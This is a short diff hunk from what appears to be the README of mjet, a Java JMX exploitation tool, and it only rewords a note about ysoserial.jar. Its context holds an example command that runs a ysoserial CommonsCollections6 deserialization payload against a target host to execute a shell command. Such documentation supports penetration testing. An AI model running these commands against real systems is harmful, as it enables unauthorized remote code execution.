@@ -210,7 +210,7 @@ minmaxer@prellermbp:~/mjet$
 ### Exploit Java deserialization with ysoserial
 
 Exploit Java deserialization with ysoserial on target:
-(The file ysoserial.jar must be present in the mjet directory.)
+The file ysoserial.jar must be present in the mjet directory.
 
 ```
 h0ng10@rocksteady:~/mjet$ jython mjet.py 10.55.90.81 2222 super_secret deserialize CommonsCollections6 "touch /tmp/filename"
